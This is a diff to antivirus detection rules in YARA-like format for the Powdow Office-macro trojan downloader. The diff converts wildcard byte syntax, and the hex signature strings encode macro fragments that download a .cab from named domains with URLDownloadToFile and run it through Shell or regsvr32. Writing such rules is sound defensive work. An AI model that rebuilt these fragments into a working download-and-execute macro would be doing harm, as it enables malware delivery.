@@ -16,7 +16,7 @@ rule TrojanDownloader_O97M_Powdow_MTB_2{
 		description = "TrojanDownloader:O97M/Powdow!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
 		
 	strings :
-		$a_03_0 = {66 72 6d 2e 64 6f 77 6e 6c 6f 61 64 20 90 02 02 2c 20 22 63 32 2e 70 64 66 22 90 00 } //1
+		$a_03_0 = {66 72 6d 2e 64 6f 77 6e 6c 6f 61 64 20 [0-02] 2c 20 22 63 32 2e 70 64 66 22 } //1
 		$a_01_1 = {53 68 65 6c 6c 20 77 75 20 26 20 62 6e 20 26 20 22 33 32 20 63 32 2e 70 64 66 22 } //1 Shell wu & bn & "32 c2.pdf"
 		$a_01_2 = {22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 } //1 "URLDownloadToFileA"
 		$a_01_3 = {2e 53 65 6c 65 63 74 4e 6f 64 65 73 28 22 2f 2f 49 74 65 6d 73 22 29 28 31 29 2e 43 68 69 6c 64 4e 6f 64 65 73 28 32 29 2e 54 65 78 74 } //1 .SelectNodes("//Items")(1).ChildNodes(2).Text
@@ -41,7 +41,7 @@ rule TrojanDownloader_O97M_Powdow_MTB_4{
 		description = "TrojanDownloader:O97M/Powdow!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
 	strings :
-		$a_03_0 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 39 79 67 77 32 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 90 01 01 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29 90 00 } //1
+		$a_03_0 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 39 79 67 77 32 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 ?? 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29 } //1
 		$a_01_1 = {2e 72 75 6e 20 22 72 65 67 73 22 20 2b 20 22 76 72 33 32 20 22 20 26 20 56 77 } //1 .run "regs" + "vr32 " & Vw
 		$a_01_2 = {22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 } //1 "URLDownloadToFileA"
 	condition:
@@ -53,7 +53,7 @@ rule TrojanDownloader_O97M_Powdow_MTB_5{
 		description = "TrojanDownloader:O97M/Powdow!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
 		
 	strings :
-		$a_03_0 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 6e 32 66 37 39 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 90 01 01 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29 90 00 } //1
+		$a_03_0 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 6e 32 66 37 39 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 ?? 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29 } //1
 		$a_01_1 = {2e 72 75 6e 20 22 72 65 67 73 22 20 2b 20 22 76 72 33 32 20 22 20 26 20 56 77 } //1 .run "regs" + "vr32 " & Vw
 		$a_01_2 = {22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22 } //1 "URLDownloadToFileA"
 	condition:
